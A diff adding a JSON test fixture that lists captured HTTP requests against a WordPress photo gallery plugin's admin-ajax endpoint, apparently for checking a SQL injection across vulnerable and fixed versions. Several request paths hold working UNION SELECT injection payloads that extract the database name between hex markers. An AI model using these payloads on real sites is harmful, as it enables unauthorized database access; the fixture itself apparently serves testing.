@@ -1,0 +1,104 @@
+{
+  "responses": [
+    {
+      "name": "ordinary",
+      "source": "tmp/wordpress-photo-gallery-feasibility/owner-1.5.82-20261116T083336/receipt.json",
+      "source_sha256": "24069db9a7dff735921990d52c6944a10c3a0b8905846bd5e30c88a10e3aac21",
+      "request_index_zero_based": 6,
+      "request_name": "native-gallery-ajax",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1",
+      "body_sha256": "980d168c1ebb06b5c943e47472922e7e88da82a65b1a2bfd00ec0cc084601e17",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    },
+    {
+      "name": "mixed_scalar",
+      "source": "tmp/wordpress-photo-gallery-feasibility/owner-1.5.82-20261116T083336/receipt.json",
+      "source_sha256": "24069db9a7dff735921990d52c6944a10c3a0b8905846bd5e30c88a10e3aac21",
+      "request_index_zero_based": 10,
+      "request_name": "native-sql-database",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0%5B%5D=%29%22+UNION+SELECT+15000%2C15001%2C15002%2C15003%2C15004%2C15005%2C15006%2C%28concat%280x6d6f64756c655f7461726765745f70686f746f7c%2Cdatabase%28%29%29%29%2C15008%2C15009%2C15010%2C15011%2C15012%2C15013%2C15014%2C15015%2C15016%2C15017%2C15018%2C15019%2C15020%2C15021%2C15022+--+-",
+      "body_sha256": "c100e5713ea940ecbc2b77d986ddd716b5557ce59b96c015696ad8b0a5f392b7",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    },
+    {
+      "name": "empty_gallery",
+      "source": "tmp/wordpress-photo-gallery-feasibility/owner-1.5.82-20261116T083336/receipt.json",
+      "source_sha256": "24069db9a7dff735921990d52c6944a10c3a0b8905846bd5e30c88a10e3aac21",
+      "request_index_zero_based": 8,
+      "request_name": "native-no-matching-tag",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0%5B%5D=999999",
+      "body_sha256": "7e5266a8daf990cadcabaeb53d7ac02ee44d84d79771a46677f51d00356e960b",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    },
+    {
+      "name": "unknown_shortcode",
+      "source": "tmp/wordpress-photo-gallery-feasibility/owner-1.5.82-20261116T083336/receipt.json",
+      "source_sha256": "24069db9a7dff735921990d52c6944a10c3a0b8905846bd5e30c88a10e3aac21",
+      "request_index_zero_based": 9,
+      "request_name": "native-unknown-shortcode",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=999999",
+      "body_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    },
+    {
+      "name": "fixed_no_images",
+      "source": "tmp/wordpress-photo-gallery-feasibility/native-1.6.0-20261116T083001/receipt.json",
+      "source_sha256": "44f6ca5bac52ae151ee265a5c50ca79ce8054e0775b280f29c3431954e58adf2",
+      "request_index_zero_based": 10,
+      "request_name": "native-sql-database",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0%5B%5D=%29%22+UNION+SELECT+15000%2C15001%2C15002%2C15003%2C15004%2C15005%2C15006%2C%28concat%280x6d6f64756c655f7461726765745f70686f746f7c%2Cdatabase%28%29%29%29%2C15008%2C15009%2C15010%2C15011%2C15012%2C15013%2C15014%2C15015%2C15016%2C15017%2C15018%2C15019%2C15020%2C15021%2C15022+--+-",
+      "body_sha256": "7e5266a8daf990cadcabaeb53d7ac02ee44d84d79771a46677f51d00356e960b",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    },
+    {
+      "name": "framed_show",
+      "source": "tmp/wordpress-photo-gallery-feasibility/extended-1.5.82-20261116T084827/receipt.json",
+      "source_sha256": "a817bae5772d6edd181c18f620b0f88197ed7ddfd9d049733a22c96363feca10",
+      "request_index_zero_based": 22,
+      "request_name": "native-framed-42-database",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=42&bwg_tag_id_bwg_thumbnails_0%5B%5D=%29%22+AND+0+UNION+SELECT+15000%2C15001%2C15002%2C15003%2C15004%2C15005%2C15006%2C%28concat%280x70675f6e61746976655f73746172745f34325f64617461626173655f%2Cifnull%28concat%280x56%2Chex%28cast%28%28database%28%29%29+as+binary%29%29%29%2C0x4e%29%2C0x5f70675f6e61746976655f656e64%29%29%2C15008%2C15009%2C15010%2C15011%2C15012%2C15013%2C15014%2C15015%2C15016%2C15017%2C15018%2C15019%2C15020%2C15021%2C15022+--+-",
+      "body_sha256": "e41364c203d79d77a96d676b231d1ebef45d445388db17e7e7053999367dc9f0",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    },
+    {
+      "name": "framed_title_off",
+      "source": "tmp/wordpress-photo-gallery-feasibility/extended-1.5.82-20261116T084827/receipt.json",
+      "source_sha256": "a817bae5772d6edd181c18f620b0f88197ed7ddfd9d049733a22c96363feca10",
+      "request_index_zero_based": 26,
+      "request_name": "native-framed-43-database",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=43&bwg_tag_id_bwg_thumbnails_0%5B%5D=%29%22+AND+0+UNION+SELECT+15000%2C15001%2C15002%2C15003%2C15004%2C15005%2C15006%2C%28concat%280x70675f6e61746976655f73746172745f34335f64617461626173655f%2Cifnull%28concat%280x56%2Chex%28cast%28%28database%28%29%29+as+binary%29%29%29%2C0x4e%29%2C0x5f70675f6e61746976655f656e64%29%29%2C15008%2C15009%2C15010%2C15011%2C15012%2C15013%2C15014%2C15015%2C15016%2C15017%2C15018%2C15019%2C15020%2C15021%2C15022+--+-",
+      "body_sha256": "ea21f8429fcd0a0934eb6ac3670051427913ddcf5354823f99e651d6eb341508",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    },
+    {
+      "name": "framed_null",
+      "source": "tmp/wordpress-photo-gallery-feasibility/extended-1.5.82-20261116T084827/receipt.json",
+      "source_sha256": "a817bae5772d6edd181c18f620b0f88197ed7ddfd9d049733a22c96363feca10",
+      "request_index_zero_based": 14,
+      "request_name": "native-framed-1-null",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0%5B%5D=%29%22+AND+0+UNION+SELECT+15000%2C15001%2C15002%2C15003%2C15004%2C15005%2C15006%2C%28concat%280x70675f6e61746976655f73746172745f315f6e756c6c5f%2Cifnull%28concat%280x56%2Chex%28cast%28%28select+NULL%29+as+binary%29%29%29%2C0x4e%29%2C0x5f70675f6e61746976655f656e64%29%29%2C15008%2C15009%2C15010%2C15011%2C15012%2C15013%2C15014%2C15015%2C15016%2C15017%2C15018%2C15019%2C15020%2C15021%2C15022+--+-",
+      "body_sha256": "1cbff283ea52bf5b82b7f9cefe2fd47cc7641bc19a18edab3fc5c8cbf2251bff",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    },
+    {
+      "name": "framed_empty",
+      "source": "tmp/wordpress-photo-gallery-feasibility/extended-1.5.82-20261116T084827/receipt.json",
+      "source_sha256": "a817bae5772d6edd181c18f620b0f88197ed7ddfd9d049733a22c96363feca10",
+      "request_index_zero_based": 15,
+      "request_name": "native-framed-1-empty",
+      "method": "GET",
+      "path": "/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0%5B%5D=%29%22+AND+0+UNION+SELECT+15000%2C15001%2C15002%2C15003%2C15004%2C15005%2C15006%2C%28concat%280x70675f6e61746976655f73746172745f315f656d7074795f%2Cifnull%28concat%280x56%2Chex%28cast%28%28repeat%280x61%2C0%29%29+as+binary%29%29%29%2C0x4e%29%2C0x5f70675f6e61746976655f656e64%29%29%2C15008%2C15009%2C15010%2C15011%2C15012%2C15013%2C15014%2C15015%2C15016%2C15017%2C15018%2C15019%2C15020%2C15021%2C15022+--+-",
+      "body_sha256": "f86c1d580dc9b40e05d2d3085a85f3c2e72933441c9b1e6791b0334680fcd9e3",
+      "transformation": "Exact decoded body bytes; response headers/cookies omitted. Selected cases disclose no credentials."
+    }
+  ],
+  "unit_mutations": "The adapter substitutes generated scalar frames into named captured placeholders. Mixed-caption, reflection, ambiguity and malformed variants are labeled synthetic; unchanged source bodies above remain genuine native captures."
+}
